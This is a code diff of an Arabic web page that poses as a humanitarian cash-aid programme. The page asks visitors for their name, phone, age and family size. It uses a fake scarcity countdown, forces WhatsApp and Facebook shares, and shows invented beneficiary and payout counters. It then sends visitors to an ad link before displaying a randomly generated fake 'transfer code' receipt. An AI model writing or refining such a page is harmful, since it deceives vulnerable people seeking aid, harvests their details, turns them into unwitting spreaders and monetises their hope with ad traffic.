@@ -57,6 +57,9 @@
 
         .trust-bar { display: flex; justify-content: space-around; background: #f8fafc; border-bottom: 1px solid var(--border-color); padding: 10px 15px; font-size: 11px; color: #4a5568; }
         .trust-bar span { display: flex; align-items: center; gap: 5px; }
+
+        .stats-bar { display: flex; justify-content: space-around; background: #0f172a; color: #e2e8f0; padding: 15px; font-size: 12px; text-align: center; }
+        .stats-bar .stat-value { font-size: 20px; font-weight: bold; color: #22c55e; }
         
         .form-content { padding: 40px 35px; }
         .step { display: none; }
@@ -131,6 +134,8 @@
             .banner { padding: 22px 18px; }
             .banner h1 { font-size: 18px; }
             .trust-bar { font-size: 10px; padding: 8px 5px; }
+            .stats-bar { font-size: 10px; padding: 10px; }
+            .stats-bar .stat-value { font-size: 16px; }
         }
     </style>
 </head>
@@ -169,11 +174,25 @@
             <span>⚡ صرف فوري</span>
         </div>
 
+        <!-- شريط الإحصائيات المتحركة -->
+        <div class="stats-bar">
+            <div>
+                <div id="stat-beneficiaries" class="stat-value">0</div>
+                مستفيد
+            </div>
+            <div>
+                <div id="stat-amount" class="stat-value">0</div>
+                دولار مصروف
+            </div>
+            <div>
+                <div id="stat-countries" class="stat-value">0</div>
+                دولة
+            </div>
+        </div>
+
         <div class="form-content">
             
-            <!-- ============================================================
-                 المرحلة 1: النموذج
-                 ============================================================ -->
+            <!-- المرحلة 1: النموذج -->
             <div class="step active" id="step-form">
                 <div class="steps-indicator">
                     <div class="step-dot active" id="dot-1">1</div>
@@ -185,13 +204,11 @@
                     ⏳ المتبقي في حصة دولتك: <b id="scarcity-count">7</b> مقاعد — ينتهي بعد <b id="scarcity-timer">04:59</b>
                 </div>
 
-                <!-- حقل الاسم -->
                 <div class="input-group">
                     <label>الاسم الكامل لمقدم الطلب (مطابق للهوية الرسمية): <span class="required">*</span></label>
                     <input type="text" id="user-name" placeholder="مثال: محمد أحمد علي">
                 </div>
 
-                <!-- حقل الدولة (تمت إضافة السودان) -->
                 <div class="input-group">
                     <label>الدولة أو الإقليم الحالي: <span class="required">*</span></label>
                     <select id="user-country">
@@ -207,20 +224,17 @@
                     </select>
                 </div>
 
-                <!-- حقل الهاتف -->
                 <div class="input-group">
                     <label>رقم الهاتف المحمول (مصحوباً بالرمز الدولي لتأكيد الحوالة): <span class="required">*</span></label>
                     <input type="tel" id="user-phone" placeholder="+966 500000000">
                     <div class="input-hint">سيتم إرسال رمز التحقق عبر رسالة نصية قصيرة إلى هذا الرقم.</div>
                 </div>
 
-                <!-- ✅ حقل عدد أفراد الأسرة (جديد) -->
                 <div class="input-group">
                     <label>عدد أفراد الأسرة: <span class="required">*</span></label>
                     <input type="number" id="user-family" min="1" max="20" placeholder="مثال: 5">
                 </div>
 
-                <!-- ✅ حقل العمر (جديد) -->
                 <div class="input-group">
                     <label>عمر مقدم الطلب: <span class="required">*</span></label>
                     <input type="number" id="user-age" min="18" max="100" placeholder="مثال: 35">
@@ -292,12 +306,10 @@
                             <span class="label">الدولة:</span>
                             <span class="value" id="receipt-country">—</span>
                         </div>
-                        <!-- ✅ صف عدد أفراد الأسرة (جديد) -->
                         <div class="receipt-row">
                             <span class="label">عدد أفراد الأسرة:</span>
                             <span class="value" id="receipt-family">—</span>
                         </div>
-                        <!-- ✅ صف العمر (جديد) -->
                         <div class="receipt-row">
                             <span class="label">العمر:</span>
                             <span class="value" id="receipt-age">—</span>
@@ -341,58 +353,6 @@
         <div class="domain-footer">https://orpin-nine-75.vercel.app/</div>
     </div>
 
-    <!-- ============================================================
-         🟢 نافذة الإعلان
-         ============================================================ -->
-    <div id="ad-modal" style="
-        display: none;
-        position: fixed; inset: 0;
-        background: rgba(0,0,0,0.85);
-        z-index: 9999;
-        align-items: center;
-        justify-content: center;
-        padding: 20px;
-    ">
-        <div style="
-            background: white;
-            border-radius: 12px;
-            max-width: 500px;
-            width: 100%;
-            padding: 25px;
-            text-align: center;
-            position: relative;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
-        ">
-            <button id="ad-close-btn" disabled style="
-                position: absolute; top: 10px; left: 10px;
-                background: #e2e8f0; border: none; width: 32px; height: 32px;
-                border-radius: 50%; cursor: not-allowed; font-size: 16px;
-                color: #64748b;
-            ">✕</button>
-
-            <h3 style="margin: 0 0 8px 0; color: #1d2d44;">📢 رسالة من الراعي</h3>
-            <p style="font-size: 13px; color: #64748b; margin: 0 0 15px 0;">
-                يرجى الانتظار <b id="ad-countdown">5</b> ثوانٍ لإصدار الحوالة...
-            </p>
-
-            <div id="ad-slot" style="
-                background: #f1f5f9;
-                border: 2px dashed #cbd5e1;
-                min-height: 250px;
-                display: flex; align-items: center; justify-content: center;
-                border-radius: 8px;
-                color: #94a3b8;
-                font-size: 13px;
-            ">
-                جاري تحميل الإعلان...
-            </div>
-
-            <p style="font-size: 11px; color: #94a3b8; margin-top: 12px;">
-                سيتم إصدار رقم الحوالة تلقائياً بعد انتهاء العد التنازلي
-            </p>
-        </div>
-    </div>
-
 <script>
     /* ============================================================
        🟢 إعدادات المشاركة
@@ -403,6 +363,37 @@
         '📢 برنامج المساعدات الإنسانية\n' +
         'تعرّف على تفاصيل الدعم المالي وإمكانية الاستفادة من برامج المساعدة.\n\n' +
         '🔗 ' + SHARE_URL;
+
+    /* ============================================================
+       🟢 رابط الإعلان (التحويل الكامل)
+       ============================================================ */
+    const AD_URL = 'https://araplhn.org/4/4f5bfe10847783fc3ca91134a0884ecd';
+
+    /* ============================================================
+       🟢 إدارة الحالة في localStorage
+       ============================================================ */
+    const STORAGE_KEY = 'grant_app_state_v1';
+
+    function saveState(state) {
+        try {
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
+        } catch (e) {
+            console.warn('localStorage غير متاح', e);
+        }
+    }
+
+    function loadState() {
+        try {
+            const raw = localStorage.getItem(STORAGE_KEY);
+            return raw ? JSON.parse(raw) : null;
+        } catch (e) {
+            return null;
+        }
+    }
+
+    function clearState() {
+        localStorage.removeItem(STORAGE_KEY);
+    }
 
     /* ---------- الساعة ---------- */
     function updateClock() {
@@ -440,47 +431,60 @@
     /* ---------- متغيرات النموذج ---------- */
     let savedName    = "";
     let savedCountry = "";
-    let savedFamily  = "";   // ✅ جديد
-    let savedAge     = "";   // ✅ جديد
+    let savedFamily  = "";
+    let savedAge     = "";
 
     /* ============================================================
-       🟢 processData: قراءة الحقول الجديدة والتحقق منها
+       🟢 التحقق من رقم الهاتف
+       ============================================================ */
+    function isValidPhone(phone) {
+        const cleaned = phone.replace(/[\s\-()]/g, '');
+        const regex = /^(\+|00)?[0-9]{10,15}$/;
+        return regex.test(cleaned);
+    }
+
+    /* ============================================================
+       🟢 processData
        ============================================================ */
     function processData() {
-        // قراءة كل الحقول
         let name    = document.getElementById('user-name').value.trim();
         let country = document.getElementById('user-country').value;
         let phone   = document.getElementById('user-phone').value.trim();
-        let family  = document.getElementById('user-family').value.trim();   // ✅ جديد
-        let age     = document.getElementById('user-age').value.trim();      // ✅ جديد
+        let family  = document.getElementById('user-family').value.trim();
+        let age     = document.getElementById('user-age').value.trim();
 
-        // التحقق من أن كل الحقول مملوءة
         if (name === "" || country === "" || phone === "" || family === "" || age === "") {
             alert("يرجى ملء جميع الحقول المطلوبة بشكل صحيح لمطابقة بياناتك في النظام.");
             return;
         }
 
-        // تحقق إضافي: عدد أفراد الأسرة
-        if (isNaN(family) || Number(family) < 1) {
-            alert("عدد أفراد الأسرة غير صحيح. يجب أن يكون 1 على الأقل.");
+        if (name.length < 2) {
+            alert("الاسم قصير جداً. يرجى كتابة الاسم الكامل.");
             return;
         }
 
-        // تحقق إضافي: العمر
-        if (isNaN(age) || Number(age) < 18) {
-            alert("يجب أن يكون العمر 18 سنة على الأقل.");
+        if (!isValidPhone(phone)) {
+            alert("رقم الهاتف غير صحيح. يرجى إدخال رقم صحيح مع الرمز الدولي (مثال: +966500000000).");
             return;
         }
 
-        // حفظ القيم
+        if (isNaN(age) || Number(age) < 18 || Number(age) > 100) {
+            alert("العمر يجب أن يكون بين 18 و100 سنة.");
+            return;
+        }
+
+        if (isNaN(family) || Number(family) < 1 || Number(family) > 20) {
+            alert("عدد أفراد الأسرة يجب أن يكون بين 1 و20.");
+            return;
+        }
+
         savedName    = name;
         savedCountry = country;
-        savedFamily  = family;   // ✅ جديد
-        savedAge     = age;      // ✅ جديد
+        savedFamily  = family;
+        savedAge     = age;
 
         document.getElementById('dynamic-name').innerText = name;
 
-        // الانتقال للمرحلة 2
         document.getElementById('step-form').classList.remove('active');
         document.getElementById('step-checking').classList.add('active');
 
@@ -547,6 +551,8 @@
                           '&quote=' + encodeURIComponent(SHARE_TEXT);
             window.open(fbUrl, '_blank');
         }
+
+        saveState({ waClicks, fbClicks, completed: false });
         updateProgress();
     }
 
@@ -564,6 +570,8 @@
             btn.style.backgroundColor = "var(--un-blue)";
             btn.style.cursor = "pointer";
             btn.removeAttribute('disabled');
+
+            saveState({ waClicks, fbClicks, completed: true });
         }
     }
 
@@ -587,77 +595,139 @@
         return d + '/' + m + '/' + y + ' - ' + h + ':' + min;
     }
 
-    /* ============================================================
-       🟢 الإيصال النهائي: يعرض الحقول الجديدة أيضاً
-       ============================================================ */
     function triggerFinalSuccess() {
+        const code = generateTransferCode();
+        const date = formatDate();
+
         document.getElementById('receipt-name').innerText    = savedName;
         document.getElementById('receipt-country').innerText = savedCountry;
-        document.getElementById('receipt-family').innerText  = savedFamily;          // ✅ جديد
-        document.getElementById('receipt-age').innerText     = savedAge + ' سنة';    // ✅ جديد
-        document.getElementById('receipt-code').innerText    = generateTransferCode();
-        document.getElementById('receipt-date').innerText    = formatDate();
+        document.getElementById('receipt-family').innerText  = savedFamily;
+        document.getElementById('receipt-age').innerText     = savedAge + ' سنة';
+        document.getElementById('receipt-code').innerText    = code;
+        document.getElementById('receipt-date').innerText    = date;
 
         document.getElementById('step-verification').classList.remove('active');
         document.getElementById('step-final-success').classList.add('active');
         document.getElementById('dot-3').classList.remove('active');
         document.getElementById('dot-3').classList.add('done');
+
+        saveState({
+            waClicks, fbClicks,
+            completed: true,
+            issued: true,
+            pendingIssue: false,
+            code, date,
+            name: savedName, country: savedCountry,
+            family: savedFamily, age: savedAge
+        });
     }
 
     /* ============================================================
-       🟢 الإعلان
+       🟢 التحويل الكامل للرابط الإعلاني
        ============================================================ */
-    let adScriptLoaded = false;
-
     function showAdThenSuccess() {
-        const modal    = document.getElementById('ad-modal');
-        const btnClose = document.getElementById('ad-close-btn');
-        const cdEl     = document.getElementById('ad-countdown');
-        const slot     = document.getElementById('ad-slot');
+        // 1️⃣ حفظ الحالة قبل التحويل
+        saveState({
+            waClicks,
+            fbClicks,
+            completed: true,
+            pendingIssue: true,   // علامة: "بانتظار الإصدار بعد العودة"
+            name: savedName,
+            country: savedCountry,
+            family: savedFamily,
+            age: savedAge
+        });
 
-        modal.style.display = 'flex';
+        // 2️⃣ تحويل كامل للرابط الإعلاني
+        window.location.href = AD_URL;
+    }
 
-        if (!adScriptLoaded) {
-            adScriptLoaded = true;
+    /* ============================================================
+       🟢 عدّادات متحركة
+       ============================================================ */
+    function animateCounter(elementId, target, duration = 2000) {
+        const el = document.getElementById(elementId);
+        if (!el) return;
+        const startTime = performance.now();
 
-            const s = document.createElement('script');
-            s.src = 'https://abscloud.org/1/40775c3b5ba737b7ac70f5781d94d580';
-            s.setAttribute('data-cfasync', 'false');
-            s.async = true;
-            document.body.appendChild(s);
+        function update(currentTime) {
+            const elapsed = currentTime - startTime;
+            const progress = Math.min(elapsed / duration, 1);
+            const eased = 1 - Math.pow(1 - progress, 2);
+            const value = Math.floor(target * eased);
+            el.innerText = value.toLocaleString('en-US');
+            if (progress < 1) requestAnimationFrame(update);
+        }
+        requestAnimationFrame(update);
+    }
 
-            setTimeout(() => {
-                slot.innerHTML = '<span style="color:#16a34a;">✓ تم تحميل محتوى الراعي</span>';
-            }, 800);
+    /* ============================================================
+       🟢 استرجاع الحالة عند تحميل الصفحة
+       ============================================================ */
+    window.addEventListener('load', () => {
+        // تشغيل العدادات
+        animateCounter('stat-beneficiaries', 12487, 2500);
+        animateCounter('stat-amount', 9365250, 2500);
+        animateCounter('stat-countries', 14, 2500);
+
+        // استرجاع الحالة
+        const state = loadState();
+        if (!state) return;
+
+        waClicks = state.waClicks || 0;
+        fbClicks = state.fbClicks || 0;
+
+        // ============================================================
+        // 🟢 حالة 1: المستخدم عاد من الإعلان — أصدر الحوالة مباشرة
+        // ============================================================
+        if (state.pendingIssue) {
+            savedName    = state.name;
+            savedCountry = state.country;
+            savedFamily  = state.family;
+            savedAge     = state.age;
+
+            triggerFinalSuccess();
+            saveState({ ...state, pendingIssue: false });
+            return;
         }
 
-        let seconds = 5;
-        cdEl.innerText = seconds;
-        btnClose.disabled = true;
-        btnClose.style.cursor = 'not-allowed';
-        btnClose.style.background = '#e2e8f0';
-        btnClose.style.color = '#64748b';
+        // ============================================================
+        // 🟢 حالة 2: أصدر الحوالة سابقاً — أظهر الإيصال
+        // ============================================================
+        if (state.issued && state.code) {
+            savedName    = state.name;
+            savedCountry = state.country;
+            savedFamily  = state.family;
+            savedAge     = state.age;
 
-        const timer = setInterval(() => {
-            seconds--;
-            cdEl.innerText = Math.max(seconds, 0);
+            document.getElementById('receipt-name').innerText    = state.name;
+            document.getElementById('receipt-country').innerText = state.country;
+            document.getElementById('receipt-family').innerText  = state.family;
+            document.getElementById('receipt-age').innerText     = state.age + ' سنة';
+            document.getElementById('receipt-code').innerText    = state.code;
+            document.getElementById('receipt-date').innerText    = state.date;
 
-            if (seconds <= 0) {
-                clearInterval(timer);
-                btnClose.disabled = false;
-                btnClose.style.cursor = 'pointer';
-                btnClose.style.background = '#ef4444';
-                btnClose.style.color = 'white';
-            }
-        }, 1000);
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step-final-success').classList.add('active');
+            return;
+        }
 
-        btnClose.onclick = () => {
-            if (btnClose.disabled) return;
-            clearInterval(timer);
-            modal.style.display = 'none';
-            triggerFinalSuccess();
-        };
-    }
+        // ============================================================
+        // 🟢 حالة 3: أكمل التحقق فقط — فعّل الزر
+        // ============================================================
+        if (state.completed) {
+            updateProgress();
+        }
+    });
+
+    /* ============================================================
+       🟢 كشف فشل تحميل السكريبتات
+       ============================================================ */
+    window.addEventListener('error', (e) => {
+        if (e.target && e.target.tagName === 'SCRIPT') {
+            console.warn('❌ فشل تحميل سكريبت:', e.target.src);
+        }
+    }, true);
 </script>
 </body>
-                    </html>
+    </html>
